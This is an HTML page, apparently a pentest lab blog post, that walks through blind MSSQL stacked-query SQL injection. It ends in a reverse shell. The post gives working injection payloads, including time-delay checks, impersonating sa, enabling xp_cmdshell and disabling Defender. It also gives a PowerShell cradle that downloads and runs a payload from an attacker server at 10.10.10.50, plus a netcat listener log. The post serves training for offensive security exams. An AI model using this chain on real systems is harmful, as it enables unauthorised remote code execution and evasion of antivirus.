@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Blind but Not Stuck: MSSQL Stacked Queries to Shell | Y3llowDuck</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Sora:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:        #0d1117;
+    --bg2:       #161b22;
+    --bg3:       #1c2330;
+    --border:    #30363d;
+    --blue:      #58a6ff;
+    --green:     #3fb950;
+    --red:       #f85149;
+    --yellow:    #e3b341;
+    --purple:    #bc8cff;
+    --text:      #e6edf3;
+    --muted:     #8b949e;
+    --dot-r:     #ff5f57;
+    --dot-y:     #febc2e;
+    --dot-g:     #28c840;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Sora', sans-serif;
+    font-size: 16px;
+    line-height: 1.75;
+    padding: 0;
+  }
+
+  /* ── HEADER ── */
+  header {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 14px 32px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+
+  .logo {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    color: var(--green);
+    letter-spacing: 0.04em;
+  }
+
+  .logo span { color: var(--muted); }
+
+  .header-tags {
+    margin-left: auto;
+    display: flex;
+    gap: 8px;
+  }
+
+  .tag {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    padding: 3px 10px;
+    border-radius: 20px;
+    border: 1px solid;
+  }
+
+  .tag.red   { color: var(--red);    border-color: var(--red);    background: rgba(248,81,73,.08); }
+  .tag.blue  { color: var(--blue);   border-color: var(--blue);   background: rgba(88,166,255,.08); }
+  .tag.green { color: var(--green);  border-color: var(--green);  background: rgba(63,185,80,.08); }
+
+  /* ── HERO ── */
+  .hero {
+    padding: 64px 32px 48px;
+    max-width: 860px;
+    margin: 0 auto;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .hero-eyebrow {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--green);
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    margin-bottom: 16px;
+  }
+
+  .hero h1 {
+    font-family: 'Sora', sans-serif;
+    font-size: clamp(26px, 4vw, 40px);
+    font-weight: 700;
+    line-height: 1.2;
+    color: var(--text);
+    margin-bottom: 20px;
+  }
+
+  .hero h1 .accent { color: var(--red); }
+
+  .hero-meta {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--muted);
+    display: flex;
+    gap: 24px;
+    flex-wrap: wrap;
+  }
+
+  .hero-meta span::before { content: '// '; color: var(--border); }
+
+  /* ── ARTICLE BODY ── */
+  article {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 48px 32px 80px;
+  }
+
+  p {
+    color: #c9d1d9;
+    margin-bottom: 20px;
+    font-size: 15.5px;
+  }
+
+  /* ── SECTION HEADERS ── */
+  .section-title {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--blue);
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    margin: 52px 0 14px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .section-title::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  h2 {
+    font-family: 'Sora', sans-serif;
+    font-size: 22px;
+    font-weight: 600;
+    color: var(--text);
+    margin-bottom: 18px;
+    margin-top: 0;
+  }
+
+  /* ── TERMINAL BLOCKS ── */
+  .terminal {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    margin: 24px 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  .terminal-bar {
+    background: var(--bg3);
+    border-bottom: 1px solid var(--border);
+    padding: 10px 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .dots { display: flex; gap: 6px; }
+  .dot  { width: 12px; height: 12px; border-radius: 50%; }
+  .dot.r { background: var(--dot-r); }
+  .dot.y { background: var(--dot-y); }
+  .dot.g { background: var(--dot-g); }
+
+  .terminal-label {
+    margin-left: 8px;
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 0.06em;
+  }
+
+  .terminal-body {
+    padding: 20px 22px;
+    font-size: 13px;
+    line-height: 1.7;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .terminal-body .prompt { color: var(--green); }
+  .terminal-body .cmd    { color: var(--text); }
+  .terminal-body .kw     { color: var(--purple); }
+  .terminal-body .str    { color: var(--yellow); }
+  .terminal-body .fn     { color: var(--blue); }
+  .terminal-body .cmt    { color: var(--muted); font-style: italic; }
+  .terminal-body .muted  { color: var(--muted); }
+  .terminal-body .danger { color: var(--red); }
+  .terminal-body .ok     { color: var(--green); }
+
+  /* payload step blocks */
+  .step-block {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--red);
+    border-radius: 0 8px 8px 0;
+    margin: 16px 0;
+    overflow: hidden;
+  }
+
+  .step-block.blue-accent  { border-left-color: var(--blue); }
+  .step-block.green-accent { border-left-color: var(--green); }
+  .step-block.yellow-accent { border-left-color: var(--yellow); }
+
+  .step-header {
+    background: var(--bg3);
+    padding: 8px 18px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .step-header .step-num {
+    background: var(--red);
+    color: #000;
+    font-size: 10px;
+    font-weight: 700;
+    width: 18px;
+    height: 18px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .step-block.blue-accent  .step-num { background: var(--blue); }
+  .step-block.green-accent .step-num { background: var(--green); }
+  .step-block.yellow-accent .step-num { background: var(--yellow); }
+
+  .step-body {
+    padding: 16px 18px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    line-height: 1.7;
+    color: var(--text);
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  /* ── CALLOUT BOXES ── */
+  .callout {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--blue);
+    border-radius: 0 8px 8px 0;
+    padding: 16px 20px;
+    margin: 24px 0;
+    font-size: 14px;
+    color: #c9d1d9;
+  }
+
+  .callout.warn { border-left-color: var(--yellow); }
+  .callout.note { border-left-color: var(--green); }
+
+  .callout-title {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    margin-bottom: 8px;
+    color: var(--blue);
+  }
+
+  .callout.warn .callout-title { color: var(--yellow); }
+  .callout.note .callout-title { color: var(--green); }
+
+  /* ── INLINE CODE ── */
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12.5px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 2px 7px;
+    border-radius: 4px;
+    color: var(--yellow);
+  }
+
+  /* ── COMPARISON TABLE ── */
+  .compare {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+    margin: 24px 0;
+  }
+
+  .compare-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 20px;
+  }
+
+  .compare-card h4 {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    margin-bottom: 14px;
+    padding-bottom: 10px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .compare-card.bad  h4 { color: var(--red); }
+  .compare-card.good h4 { color: var(--green); }
+
+  .compare-card ul { list-style: none; padding: 0; }
+  .compare-card ul li {
+    font-size: 13.5px;
+    color: var(--muted);
+    padding: 4px 0;
+    padding-left: 18px;
+    position: relative;
+  }
+  .compare-card.bad  ul li::before { content: '✗'; position: absolute; left: 0; color: var(--red); }
+  .compare-card.good ul li::before { content: '✓'; position: absolute; left: 0; color: var(--green); }
+
+  /* ── TIMING VISUALIZER ── */
+  .timing-demo {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 24px;
+    margin: 24px 0;
+  }
+
+  .timing-demo h4 {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    margin-bottom: 18px;
+  }
+
+  .timing-row {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin-bottom: 12px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+  }
+
+  .timing-label { color: var(--muted); width: 180px; flex-shrink: 0; }
+  .timing-bar-wrap { flex: 1; background: var(--bg3); border-radius: 4px; height: 20px; overflow: hidden; position: relative; }
+  .timing-bar {
+    height: 100%;
+    border-radius: 4px;
+    display: flex;
+    align-items: center;
+    padding-left: 10px;
+    font-size: 10px;
+    font-weight: 700;
+  }
+  .timing-bar.normal { width: 10%; background: var(--green); color: #000; }
+  .timing-bar.delayed { width: 60%; background: var(--red); color: #fff; animation: grow 1.4s ease-out forwards; }
+
+  @keyframes grow {
+    from { width: 10%; }
+    to   { width: 60%; }
+  }
+
+  /* ── FOOTER ── */
+  footer {
+    border-top: 1px solid var(--border);
+    background: var(--bg2);
+    padding: 28px 32px;
+    text-align: center;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--muted);
+  }
+
+  footer a { color: var(--blue); text-decoration: none; }
+
+  /* ── SCROLLBAR ── */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+  @media (max-width: 600px) {
+    .compare { grid-template-columns: 1fr; }
+    .hero, article { padding-left: 18px; padding-right: 18px; }
+    header { padding: 12px 18px; }
+    .header-tags { display: none; }
+  }
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+  <div class="logo">~/Y3llowDuck<span>/blog</span></div>
+  <div class="header-tags">
+    <span class="tag red">SQLi</span>
+    <span class="tag blue">MSSQL</span>
+    <span class="tag green">OSCP/OSEP</span>
+  </div>
+</header>
+
+<!-- HERO -->
+<div class="hero">
+  <h1>Blind but Not Stuck:<br><span class="accent">MSSQL Stacked Queries to Shell</span></h1>
+  <div class="hero-meta">
+        <span>MSSQL &middot; xp_cmdshell &middot; PowerShell Cradle</span>
+  </div>
+</div>
+
+<!-- ARTICLE -->
+<article>
+
+  <p>Most pentesters or OffSec students are familiarized with inbound SQLi. Those are the kind of injections that give the user some text back to the browser. They are easier to exploit and easier to identify. But a site may be still vulnerable to SQLi even if the app isn't giving you anything back. It may allow you to run stacked queries. And you can own an actual box if that's present. Keep reading and let me explain what that is, and how it can be abused.</p>
+
+  <p>Let's start by defining the term. A stacked query is just two or more SQL statements separated by a semicolon, both executed in the same call. For example, check the two queries below:</p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="terminal-label">sql &mdash; basic stacked example</span>
+    </div>
+    <div class="terminal-body">
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> products <span class="kw">WHERE</span> id = <span class="str">1</span>; <span class="kw">SELECT</span> <span class="fn">@@version</span>;
+    </div>
+  </div>
+
+  <p>For someone who does not know TSQL it may look like a single query. But the semicolon breaks it down into two.</p>
+
+  <p>Now, both run. The problem is the app usually only shows the result of the first one. So even if your second query does something useful, you won't see it in the response.</p>
+
+  <p>MSSQL supports this natively. MySQL and Oracle? They do not, at least not in most driver configurations. So when you're dealing with MSSQL, stacked queries are a real attack surface even when everything looks blind.</p>
+
+  <div class="callout note">
+    <div class="callout-title">&#x25CF; enumeration tip</div>
+    This highlights the importance of enumeration. Use nmap or Wappalyzer to identify the technology running behind a site. If it runs Windows, chances are MSSQL is also present.
+  </div>
+
+  <p>I remember this being a huge debate back during my DBA days when I was still working for Hewlett Packard. My colleagues, Oracle DBAs, said stacked queries were bad and insecure. But at the same time, the implementation of some solutions was actually easier with TSQL because Microsoft MSSQL supports stacked queries and Linked Servers. Even today and as far as I know, this is not something Oracle does natively. To be honest, it is a curse and a blessing at the same time. And soon you will see why.</p>
+
+  <!-- SECTION 2 -->
+  <div class="section-title">02 &mdash; technique comparison</div>
+  <h2>UNION won't save you here</h2>
+
+  <div class="compare">
+    <div class="compare-card bad">
+      <h4>UNION SELECT</h4>
+      <ul>
+        <li>Column count must match exactly</li>
+        <li>Data types have to align</li>
+        <li>Requires output reflection in response</li>
+        <li>Blind = completely useless</li>
+        <li>You're guessing query structure</li>
+      </ul>
+    </div>
+    <div class="compare-card good">
+      <h4>Stacked Queries</h4>
+      <ul>
+        <li>Column count is irrelevant</li>
+        <li>Data types are irrelevant</li>
+        <li>No output reflection needed</li>
+        <li>Works perfectly blind</li>
+        <li>New statement, clean slate</li>
+      </ul>
+    </div>
+  </div>
+
+  <p>UNION is the most common way to extract data from a web app that is vulnerable to SQLi, but it has a hard requirement. The number of columns in your injected SELECT has to match the original query exactly. You also have to get the data types right. If you don't know the query structure you're injecting into, you're guessing. And even if you get it right, UNION only works when the response actually reflects column data back to you. So no output means UNION is useless.</p>
+
+  <p>But stacked queries don't care about any of that. You're not appending to the original SELECT. You're starting a new statement entirely. Column count is irrelevant. Data types are irrelevant. You're just telling the server to do something after it finishes the first query.</p>
+
+  <!-- SECTION 3 -->
+  <div class="section-title">03 &mdash; confirmation</div>
+  <h2>Confirming stacked queries</h2>
+
+  <p>Now, before you throw any payloads and start testing for stacked queries, you want to confirm the injection point actually supports it. And the easiest way to do that on MSSQL is with WAITFOR DELAY.</p>
+
+  <p>The idea is simple. You inject a second statement that tells the server to sleep for a few seconds. If the response takes that long to come back, the server executed your query. Simple.</p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="terminal-label">sql &mdash; basic time delay</span>
+    </div>
+    <div class="terminal-body"><span class="str">'</span>; <span class="kw">WAITFOR DELAY</span> <span class="str">'0:0:5'</span>; <span class="cmt">--</span></div>
+  </div>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="terminal-label">sql &mdash; conditional true (delay fires)</span>
+    </div>
+    <div class="terminal-body"><span class="str">'</span>; <span class="kw">IF</span> (<span class="str">1</span>=<span class="str">1</span>) <span class="kw">WAITFOR DELAY</span> <span class="str">'0:0:5'</span>; <span class="cmt">--</span></div>
+  </div>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="terminal-label">sql &mdash; conditional false (no delay)</span>
+    </div>
+    <div class="terminal-body"><span class="str">'</span>; <span class="kw">IF</span> (<span class="str">1</span>=<span class="str">2</span>) <span class="kw">WAITFOR DELAY</span> <span class="str">'0:0:5'</span>; <span class="cmt">--</span></div>
+  </div>
+
+  <!-- TIMING VIZ -->
+  <div class="timing-demo">
+    <h4>&#x25B6; response time delta &mdash; what you're looking for</h4>
+    <div class="timing-row">
+      <div class="timing-label">normal request</div>
+      <div class="timing-bar-wrap"><div class="timing-bar normal">~80ms</div></div>
+    </div>
+    <div class="timing-row">
+      <div class="timing-label">WAITFOR injected</div>
+      <div class="timing-bar-wrap"><div class="timing-bar delayed">~5000ms</div></div>
+    </div>
+  </div>
+
+  <p>If the response takes about five seconds longer than your baseline, you've got stacked queries. That's your confirmation.</p>
+
+  <div class="callout note">
+    <div class="callout-title">&#x25CF; tip</div>
+    Always establish a baseline response time before injecting. A slow app can mislead you. Hit the endpoint a few times clean, average the response, then inject and compare the delta.
+  </div>
+
+  <!-- SECTION 4 -->
+  <div class="section-title">04 &mdash; exploitation</div>
+  <h2>Turning stacked queries into a hell [shell]</h2>
+
+  <p>Now, once you've confirmed it works, the path to code execution on MSSQL is pretty straightforward. You need xp_cmdshell, and by default it's been disabled since SQL Server 2005. But disabled doesn't mean gone. You can turn it back on if you have the right privileges, and that's where EXECUTE AS LOGIN comes in. Oh yeah!</p>
+
+  <p>The idea is to impersonate the sa login for the duration of your injected statements. For this to work, the current login needs to have been explicitly granted IMPERSONATE on sa, or it already belongs to the sysadmin role, which gets that permission. Once you're running as sa, sp_configure is available and you can flip xp_cmdshell back on. Executing xp_cmdshell requires CONTROL SERVER permission, which sa has. That's the whole chain.</p>
+
+  <div class="callout warn">
+    <div class="callout-title">&#x26A0; before you start</div>
+    Start your listener first. The execution chain is sequential and the last payload fires your shell immediately. You want to be ready.
+    <br><br>
+    <code>rlwrap nc -lvnp 443</code>
+  </div>
+
+  <!-- STEP 0a -->
+  <div class="step-block blue-accent">
+    <div class="step-header">
+      <div class="step-num" style="background:var(--blue)">1</div>
+      impersonate sa &mdash; expose advanced options
+    </div>
+    <div class="step-body"><span style="color:#58a6ff">'; EXECUTE AS LOGIN = 'sa'</span>; EXEC sp_configure <span style="color:#e3b341">'Show Advanced Options'</span>, 1; RECONFIGURE; <span style="color:#8b949e">--</span></div>
+  </div>
+
+  <!-- STEP 0b -->
+  <div class="step-block blue-accent">
+    <div class="step-header">
+      <div class="step-num" style="background:var(--blue)">2</div>
+      enable xp_cmdshell
+    </div>
+    <div class="step-body"><span style="color:#58a6ff">';</span> EXEC sp_configure <span style="color:#e3b341">'xp_cmdshell'</span>, 1; RECONFIGURE; <span style="color:#8b949e">--</span></div>
+  </div>
+
+  <p>Now we are ready for the last two payloads that will, in this case, give us access to the underlying application or server:</p>
+
+  <!-- STEP 1 -->
+  <div class="step-block yellow-accent">
+    <div class="step-header">
+      <div class="step-num" style="background:var(--yellow);color:#000">3</div>
+      kill defender
+    </div>
+    <div class="step-body"><span style="color:#f85149">'; EXEC xp_cmdshell</span> <span style="color:#e3b341">'powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"'</span>; <span style="color:#8b949e">--</span></div>
+  </div>
+
+  <div class="callout warn">
+    <div class="callout-title">&#x26A0; this only works under two conditions</div>
+    Set-MpPreference requires administrator privileges at the OS level. xp_cmdshell runs as the SQL Server service account, so this step only works if that service account is a local admin on the machine. Run <code>whoami</code> first to confirm. Also, if Tamper Protection is enabled, the command will appear to succeed but nothing actually changes. Defender stays on and gives you no error. In lab environments Tamper Protection is usually off. In hardened real-world targets it likely isn't.
+  </div>
+
+  <!-- STEP 2 -->
+  <div class="step-block green-accent">
+    <div class="step-header">
+      <div class="step-num" style="background:var(--green);color:#000">4</div>
+      deliver &amp; execute payload via powershell cradle
+    </div>
+    <div class="step-body"><span style="color:#f85149">'; EXEC xp_cmdshell</span> <span style="color:#e3b341">'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://10.10.10.50/shell.txt'')"'</span>; <span style="color:#8b949e">--</span></div>
+  </div>
+
+  <p>The last step is the one doing the heavy lifting here. Notice that instead of dropping a binary to disk and executing it, you're telling PowerShell to reach out to your HTTP server, pull shell.txt directly into memory, and execute it on the spot. Nothing written to disk. It is a classic in-memory execution technique and a better approach than dropping malicious files on disk to obtain a reverse shell. A file on disk will be flagged immediately by Defender.</p>
+
+  <div class="callout note">
+    <div class="callout-title">&#x25CF; revshellgenerator</div>
+    shell.txt was generated via <a href="https://github.com/Y3llowDuck/OSEP/tree/main/RevShellGenerator" style="color:var(--green)">RevShellGenerator</a>. It's a polymorphic PowerShell reverse shell generator. Every run produces a functionally identical but structurally unique payload. Check my GitHub for more details.
+  </div>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="terminal-label">session 1 &mdash; generate payload</span>
+    </div>
+    <div class="terminal-body">
+<span class="prompt">└─$</span> <span class="cmd">RevShellGen --ip 10.10.10.50 --port 443 --out shell.txt</span>
+    </div>
+  </div>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="terminal-label">session 2 &mdash; http server</span>
+    </div>
+    <div class="terminal-body">
+<span class="prompt">└─$</span> <span class="cmd">sudo python3 -m http.server 80</span>
+<span class="muted">[sudo] password for kali:</span>
+<span class="ok">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+<span class="ok">10.10.10.100 - - [05/Jun/2026 13:14:10] "GET /shell.txt HTTP/1.1" 200 -</span>
+    </div>
+  </div>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="terminal-label">session 3 &mdash; listener</span>
+    </div>
+    <div class="terminal-body">
+<span class="prompt">└─$</span> <span class="cmd">rlwrap nc -lvnp 443</span>
+<span class="muted">listening on [any] 443 ...</span>
+<span class="ok">connect to [10.10.10.50] from (UNKNOWN) [10.10.10.100] 49923</span>
+<span class="ok">PS C:\Windows\system32> whoami</span>
+<span class="ok">nt authority\system</span>
+<span class="ok">PS C:\Windows\system32> hostname</span>
+<span class="ok">sql11</span>
+    </div>
+  </div>
+
+  <!-- SECTION 5 -->
+  <div class="section-title">05 &mdash; notes</div>
+  <h2>Few things to keep in mind</h2>
+
+  <p>xp_cmdshell runs as the SQL Server service account at the Windows level, not as sa. sa is a SQL login, not a Windows account. So even after impersonating sa inside SQL Server, the OS commands that xp_cmdshell spawns run under whatever Windows identity the SQL Server service is using. In a lot of lab environments that's a local admin or NT SERVICE\MSSQLSERVER. In others it's more restricted. whoami command will help you here.</p>
+
+  <p>Stacked queries are one of those SQLi techniques that don't get enough attention. Most people see a blind injection and move on. Don't. Test the WAITFOR, measure the delta, and if the server sleeps, you're already halfway to a shell. The rest is just chaining the right payloads in the right order.</p>
+
+</article>
+
+<footer>
+  written by <a href="https://github.com/Y3llowDuck">Y3llowDuck</a> with love &mdash; <a href="https://github.com/Y3llowDuck">github.com/Y3llowDuck</a>
+</footer>
+
+</body>
+</html>
